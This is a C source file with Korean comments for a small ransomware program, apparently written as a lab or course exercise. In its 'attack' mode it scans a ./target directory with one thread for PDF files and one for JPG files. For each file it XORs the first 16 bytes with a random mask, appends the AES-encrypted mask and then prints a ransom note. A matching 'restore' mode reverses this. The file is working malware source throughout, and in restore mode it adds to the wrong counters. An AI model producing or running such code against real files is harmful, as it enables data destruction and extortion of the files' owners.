#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <openssl/aes.h>
#include <dirent.h>
#include "crypto.h" // AES 암호화 관련 함수가 선언된 헤더
#include "utils.h" // XOR 및 랜덤 바이트 생성 함수가 선언된 헤터

// 파일명 길이 설정 (최대 256바이트)
#define FILENAME_LEN 256

// 전역 변수로 파일 처리 카운트 변수 선언 (스레드 간 공유)
int total_pdf_encrypted = 0; // 암호화된 PDF 파일의 총 개수
int total_jpg_encrypted = 0; // 암호화된 JPG 파일의 총 개수
int total_pdf_decrypted = 0; // 복호화된 PDF 파일의 총 개수
int total_jpg_decrypted = 0; // 복호화된 JPG 파일의 총 개수

// 스레드 간 데이터 경쟁을 방지하기 위한 뮤텍스 변수
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;

// 구조체 정의: key와 file_type을 함께 전달(스레드로 전달할 데이터)
typedef struct {
    unsigned char key[16]; // AES-128 암호화 키 (16바이트 고정)
    char file_type[4]; // 처리할 파일 타입 ("pdf" 또는 "jpg")
} thread_param_t;


// 스레드 함수 선언
void *attack(void *param); // 파일 암호화를 수행하는 함수
void *restore(void *param); // 파일 복호화를 수행하는 함수

// 파일 암호화 함수 선언
void attack_file(const char *filename, unsigned char *key, const char *file_type); // 개별 파일 암호화 함수
void restore_file(const char *filename, unsigned char *key, const char *file_type); // 개별 파일 복호화 함수

// 확장자 비교 함수 (대소문자 구분 안 함)
int has_extension(const char *filename, const char *ext) {
    char *dot = strrchr(filename, '.'); // 파일명에서 마지막 '.' 위치 탐색
    if (!dot) return 0; // 확장자가 없다면 0 반환
    return strcasecmp(dot + 1, ext) == 0; // 대소문자 구분 없이 비교
}

int main(int argc, char *argv[]) {
    // 입력 인자 수 검사 (3개 인자 필요: 실행 파일 이름, 작업 종류, 키)
    if (argc != 3) {
        printf("Usage: %s <attack/restore> <key>\n", argv[0]);
        exit(1); // 잘못된 입력 시 프로그램 종료
    }

    pthread_t thread_pdf, thread_jpg; // PDF와 JPG 파일을 처리할 스레드 변수 생성
    void *(*f)(void *) = NULL; // 함수 포인터 선언 (암호화 또는 복호화 함수 지정)

    // 키 설정 (16바이트로 맞추기, 부족한 경우 0으로 패딩)
    unsigned char key[16] = {0}; // 초기화
    if (strlen(argv[2]) < 16) {
        memset(key, 0, 16);
        memcpy(key, argv[2], strlen(argv[2])); // 입력 키를 복사 (최대 16바이트)
    } else {
        memcpy(key, argv[2], 16); // 입력 키의 처음 16바이트만 사용
    }

    // 스레드에서 실행할 함수 포인터 선택
    if (strcmp(argv[1], "attack") == 0) {
        f = attack; // 파일 암호화 작업 수행
    }
    else if (strcmp(argv[1], "restore") == 0) {
        f = restore; // 파일 복호화 작업 수행
    }
    else {
        printf("Invalid operation\n");
        exit(1); // 잘못된 작업 종류 입력 시 종료
    }


    // thread_param_t 구조체를 사용해 key와 file_type을 전달 (구조체 초기화)
    thread_param_t param_pdf = {{0}, "pdf"};
    thread_param_t param_jpg = {{0}, "jpg"};
    memcpy(param_pdf.key, key, 16); // 키 복사
    memcpy(param_jpg.key, key, 16); // 키 복사

    // PDF와 JPG 파일 암호화/복호화 작업을 각각의 스레드에서 수행
    pthread_create(&thread_pdf, NULL, f, (void *)&param_pdf); // PDF 처리 스레드
    pthread_create(&thread_jpg, NULL, f, (void *)&param_jpg); // JPG 처리 스레드

    // 메인 스레드가 두 작업 스레드가 종료될 때까지 대기
    pthread_join(thread_pdf, NULL);
    pthread_join(thread_jpg, NULL);

    // 작업 종료 후 결과 출력 및 랜섬 노트 출력
    if (strcmp(argv[1], "attack") == 0) {
	printf("[attack] %d pdf files were encrypted\n", total_pdf_encrypted);
	printf("[attack] %d jpg files were encrypted\n", total_jpg_encrypted);
        print_note("note_enc.txt"); // 랜섬 노트 출력
    }
    else if (strcmp(argv[1], "restore") == 0) {
	printf("[restore] %d pdf files were decrypted\n", total_pdf_decrypted);
	printf("[restore] %d jpg files were decrypted\n", total_jpg_decrypted);
        print_note("note_dec.txt"); // 복호화 노트 출력
    }

    return 0; // 프로그램 종료
}

// 파일 암호화 또는 복호화 작업을 수행하는 함수
void *attack(void *param) {
    thread_param_t *thread_param = (thread_param_t *) param;
    char *file_type = thread_param->file_type; // pdf 또는 jpg
    unsigned char *key = thread_param->key; // 암호화 키

    DIR *d = opendir("./target"); // 대상 디렉토리 열기
    struct dirent *entry; // 디렉토리 항목 읽기
    int pdf_count = 0, jpg_count = 0; // 파일 카운터 초기화
    
    // PDF와 JPG 파일 처리
    // 디렉토리 내 파일 순회
    if (d) {
        while ((entry = readdir(d)) != NULL) {
            if (has_extension(entry->d_name, file_type)) { // 파일 확장자 확인
                if (strcmp(file_type, "pdf") == 0) {
                    pdf_count++; // PDF 파일 개수 증가
                } else if (strcmp(file_type, "jpg") == 0) {
                    jpg_count++; // JPG 파일 개수 증가
                }
                attack_file(entry->d_name, key, file_type); // 파일 암호화
            }
        }
        closedir(d); // 디렉토리 닫기
    }

    // 스레드에서 처리된 결과를 메인 함수로 전달 (전역 변수 업데이트, 스레드 안전성을 위해 뮤텍스 사용)
    pthread_mutex_lock(&print_mutex);
    if (strcmp(file_type, "pdf") == 0) {
        total_pdf_encrypted += pdf_count;
    } else if (strcmp(file_type, "jpg") == 0) {
        total_jpg_encrypted += jpg_count;
    }
    pthread_mutex_unlock(&print_mutex);
    
    return NULL; // 스레드 종료
}

// 복호화를 수행하는 스레드 함수
void *restore(void *param) {
    thread_param_t *thread_param = (thread_param_t *)param;
    char *file_type = thread_param->file_type; // pdf 또는 jpg
    unsigned char *key = thread_param->key; // 복호화 키
    
    DIR* d = opendir("./target"); // 대상 디렉토리 열기
    struct dirent *entry; // 디렉토리 항목 읽기
    int pdf_count = 0, jpg_count = 0; // 파일 카운터 초기화

    // PDF와 JPG 파일 처리
    // 디렉토리 내 파일 순회
    if (d) {
        while ((entry = readdir(d)) != NULL) {
            if (has_extension(entry->d_name, file_type)) { // 파일 확장자 확인
                if (strcmp(file_type, "pdf") == 0) {
                    pdf_count++; // PDF 파일 개수 증가
                } else if (strcmp(file_type, "jpg") == 0) {
                    jpg_count++; // JPG 파일 개수 증가
                }
                restore_file(entry->d_name, key, file_type); // 파일 복호화
            }
        }
        closedir(d); // 디렉토리 닫기
    }

    // 스레드에서 처리된 결과를 메인 함수로 전달 (전역 변수 업데이트, 스레드 안정성을 위해 뮤텍스 사용)
    pthread_mutex_lock(&print_mutex);
    if (strcmp(file_type, "pdf") == 0) {
        total_pdf_encrypted += pdf_count;
    } else if (strcmp(file_type, "jpg") == 0) {
        total_jpg_encrypted += jpg_count;
    }
    pthread_mutex_unlock(&print_mutex);

    return NULL; // 스레드 종료

}

// 개별 파일 암호화 함수
void attack_file(const char *filename, unsigned char *key, const char *file_type) {
    char filepath[FILENAME_LEN]; // 파일 경로를 저장할 버퍼
    snprintf(filepath, sizeof(filepath), "target/%s", filename); // 파일 경로 생성

    // 파일 열기 (읽기/쓰기 모드)
    int fd = open(filepath, O_RDWR);
    if (fd == -1) { // 파일 열기 실패 시
        printf("open failed for file: %s\n", filename);
        return;
    }

    unsigned char plaintext[16], mask[16], ciphertext[16], encrypted_mask[16];
    
    // 파일의 첫 16바이트 읽기
    if (read(fd, plaintext, 16) != 16) {
        printf("read failed for file: %s\n", filename);
        close(fd);
        return;
    }

    // 16바이트 랜덤 mask 생성 및 XOR 암호화
    generate_random_bytes(mask, 16); // 랜덤 바이트 생성
    xor_bytes(plaintext, mask, ciphertext, 16); // XOR 연산으로 암호화

    // 파일의 처음 16바이트를 ciphertext로 덮어쓰기
    lseek(fd, 0, SEEK_SET); // 파일 포인터를 처음으로 이동
    if (write(fd, ciphertext, 16) != 16) {
        printf("write failed for file: %s\n", filename);
        close(fd);
        return;
    }

    // AES-128로 mask 암호화
    aes_encrypt(mask, key, encrypted_mask);

    // 파일 끝에 암호화된 마스크 추가
    lseek(fd, 0, SEEK_END); // 파일 포인터를 끝으로 이동
    if (write(fd, encrypted_mask, 16) != 16) {
        printf("write failed for file: %s\n", filename);
        close(fd);
        return;
    }

    printf("[attack] %s\n", filename); // 암호화 성공 메시지 출력
    close(fd); // 파일 닫기
}

// 개별 파일 복호화 함수
void restore_file(const char *filename, unsigned char *key, const char *file_type) {
    char filepath[FILENAME_LEN]; // 파일 경로를 저장할 버퍼
    snprintf(filepath, sizeof(filepath), "target/%s", filename); // 파일 경로 생성

    // 파일 열기 (읽기/쓰기 모드)
    int fd = open(filepath, O_RDWR);
    if (fd == -1) { // 파일 열기 실패 시
        printf("open failed for file: %s\n", filename);
        return;
    }

    unsigned char ciphertext[16], encrypted_mask[16], mask[16], plaintext[16];
    
    // 파일의 첫 16바이트(암호화된 데이터) 읽기
    ssize_t read_bytes = read(fd, ciphertext, 16);
    if (read_bytes != 16) {
        printf("read failed for file: %s\n", filename);
        close(fd);
        return;
    }

    // 파일 끝의 16바이트(암호화된 마스크) 읽기
    off_t file_size = lseek(fd, 0, SEEK_END); // 파일 크기 계산
    if (file_size == -1) {
        printf("lseek failed for file size\n");
        close(fd);
        return;
    }

    // 파일 크기 검사: 너무 작은 파일은 처리하지 않음
    if (file_size <= 16) {
        printf("file size is too small\n");
        close(fd);
        return;
    }

    // 파일 끝에서 16바이트 전으로 이동
    off_t new_pos = lseek(fd, file_size - 16, SEEK_SET);
    if (new_pos == -1) {
        printf("lseek failed\n");
        close(fd);
        return;
    }

    // 암호화된 마스크 읽기
    read_bytes = read(fd, encrypted_mask, 16);
    if (read_bytes != 16) {
        printf("read failed for file: %s\n", filename);
        close(fd);
        return;
    }

    // AES-128로 마스크 복호화
    aes_decrypt(encrypted_mask, key, mask);

    // XOR을 사용해 원래의 데이터 복원
    xor_bytes(ciphertext, mask, plaintext, 16);

    // 첫 16바이트에 원래 데이터(복원된 plaintext) 쓰기
    lseek(fd, 0, SEEK_SET); // 파일 포인터를 처음으로 이동
    if (write(fd, plaintext, 16) != 16) {
        printf("write failed for file: %s\n", filename);
        close(fd);
        return;
    }

    // 파일 끝의 암호화된 마스크 16바이트 제거
    ftruncate(fd, file_size - 16);

    printf("[restore] %s\n", filename); // 복호화 완료 메시지 출력
    close(fd); // 파일 닫기
}

